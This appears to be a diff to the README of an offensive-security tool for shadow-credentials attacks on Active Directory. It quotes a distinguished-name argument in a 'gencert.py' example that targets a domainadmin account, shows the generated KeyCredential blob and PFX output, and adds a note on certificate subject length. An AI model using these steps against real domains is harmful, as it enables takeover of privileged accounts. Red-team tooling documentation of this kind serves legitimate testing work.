@@ -6,11 +6,15 @@ Run the `gencert.py` python script with the DN of the user you're setting shadow
 
 ```
 ┌──(kali㉿sccm-kali)-[~/ldap_bofs/bofwhisker]
-└─$ uv run gencert.py CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net
+└─$ uv run gencert.py "CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net"
 KeyCredential: B:828:000200002000010247e54018f597c24bfe460eefacea1f1d68572635bf689fc2a46183d9d593a2200002a32418ad5ac4886e52c77fa8534295a9e49cdbe44d940473ef2357c500ee05e71b01035253413100080000030000000001000000000000000000000100019becd0dd8815ff93ecb0bde3df202492508a5e20b8d320bd1e89bc2239295b1a9fdedf7ee6f301c10aefbaebd50aada7072dbe18ee1436b39dc56e34cbd3e2b2ee20334bfaacef2bd8a622c1f79fe9f62349d22e86337c3d800a713a01e566dded5199be7c5914559fff6b0c38127cfeb0c126ef54d9ae3b29068dcaae4f09ef8f3a712443216dbc50739bfabab7c3d105068d9ffe06cb1c6fbf318944957111fc653b8a4569d3be1e555ad072627ce2abb4ff0767c4a808583d35af48a0f04b62d5831e0cd31fccd49673b047b15b980a8fc210ebe9bea3d287fbfc2d38f103826ce7795e0bfdb35ec0480d247d57c3585c5d216e0dff4a224382fa2a83310f01000401010005001000064953e8a81353dcac8a7d8787c1f88a9902000701000800083679455f1d21dc010800093679455f1d21dc01:CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net
 Converting PEM -> PFX with cryptography: CjDY8KOC.pfx
 [+] PFX: CjDY8KOC.pfx
 ```
+
+The complete distinguished name is retained as the KeyCredential owner. The
+certificate subject uses only the first `CN` component so long DNs, including
+organizational units with spaces, do not exceed OpenSSL's common-name limit.
 
 Execute the BOF with three arguments:
  - target domain
